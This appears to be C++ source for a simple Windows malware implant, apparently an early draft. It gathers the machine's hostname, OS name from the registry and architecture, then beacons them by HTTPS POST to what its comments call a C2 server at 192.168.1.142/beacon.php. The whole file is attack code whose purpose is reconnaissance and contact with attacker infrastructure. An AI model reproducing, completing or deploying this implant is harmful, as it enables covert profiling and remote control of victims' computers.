#include <iostream>
#include <string>
#include "stdafx.h"				// WinHttpClient
#include "WinHttpClient.h"		// WinHttpClient


// Function prototypes
wstring beacon(wstring beaconURL);
wstring getHostname();
wstring getOS();
wstring getArchitecture();


// Start of main() function
int main()
{
	wstring beaconURL = L"https://192.168.1.142/beacon.php";

	wcout << getHostname() << endl;
	wcout << getOS() << endl;
	wcout << getArchitecture() << endl;
	beacon(beaconURL);
	
	return 0;
}
// End of main() function


// Gets the system hostname - Working as of 06/06/16
// Returns "hostname" wstring
wstring getHostname()
{
	wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1] = L""; // wchar_t array initialization - MAX_COMPUTERNAME_LENGTH + 1 per MSDN
	DWORD size;
	GetComputerName(buffer, &size); // Gets the NetBIOS name of the local computer

	wstring hostname = buffer; // Creates new "hostname" wstring and sets value to the wchar_t array buffer above
	return hostname; // Returns the "hostname" wstring to the calling function
}
// End of getHostname() function


// Gets the system OS - Working as of 06/06/16
// Returns "os" wstring
wstring getOS()
{
	HKEY hRegistry = NULL;
	RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion", &hRegistry); // Opens a handle to the Registry
	
	DWORD size;
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, NULL, &size); // Queries the size (in bytes) for the "ProductName" Registry key - Will save size (in bytes) including null-terminator in "size" DWORD
	
	wchar_t buffer[256] = L""; // EWWWW ...HARD-CODED ARRAY SIZE
	RegQueryValueEx(hRegistry, L"ProductName", NULL, NULL, (LPBYTE) &buffer, &size); // Queries the "ProductName" Registry key and stores output in buffer

	wstring os = buffer; // Creates new "os" wstring and sets value to the wchar_t array buffer above

	RegCloseKey(hRegistry); // Closes the Registry handle

	return os; // Returns the "os" wstring to the calling function
}
// End of getOS() function


// Gets the system architecture - Working as of 06/06/16 - DOES NOT TAKE INTO ACCOUNT NON C: SYSTEM DRIVES (IE: OTHER DRIVE LETTERS)
// Returns "architecture" wstring
wstring getArchitecture()
{
	wstring architecture = L""; // Creates "architecture" wstring
	BOOL exists = PathFileExists(L"C:\\Windows\\SysWOW64"); // Determines if C:\Windows\SysWOW64 directory exists

	if (exists == TRUE) // If true, then the system architecture is x64
		architecture = L"x64";
	else // Else the system architecture is x86
		architecture = L"x86";

	return architecture; // Retruns the "architecture" wstring to the calling function
}
// End of getArchitecture() function


// Obtained from http://stackoverflow.com/questions/36774547/httpsendrequest-post-data-not-supporting-unicode
// Used to convert POST data from UTF-16 (wstring) to UTF-8 (string)
// Returns UTF-8 "out" string
string UTF8Encode(const wstring &wstr)
{
	string out = "";
	int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), wstr.length(), NULL, 0, NULL, NULL);
	if (len > 0)
	{
		out.resize(len);
		WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), wstr.length(), &out[0], len, NULL, NULL);
	}
	return out; // Returns UTF-8 string to the calling function
}
// End of UTF8Encode() function


// Beacons over HTTPS to the specified C2 server
// Returns "response" wstring
wstring beacon(wstring beaconURL)
{
	WinHttpClient beacon(beaconURL);

	beacon.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER

	// ** NEED TO ADD IN URL ENCODING FOR THE POST PARAMETERS BELOW **

	string data = "hostname=" + UTF8Encode(getHostname()) + "&os=" + UTF8Encode(getOS()) + "&architecture=" + UTF8Encode(getArchitecture()); // POST data
	beacon.SetAdditionalDataToSend((BYTE *)data.c_str(), data.size());

	wstring contentLength = to_wstring(data.length()); // We need to create new wstring for the Content-Length so we can append to the other headers

	wstring headers = L"Content-Length: ";
	headers += contentLength;
	headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
	beacon.SetAdditionalRequestHeaders(headers); // Appends headers above

	beacon.SendHttpRequest(L"POST"); // Sends the POST request

	wstring response = beacon.GetResponseContent(); // Gets POST respone and stores in "response" wstring

	return response;
}
// End of beacon() function
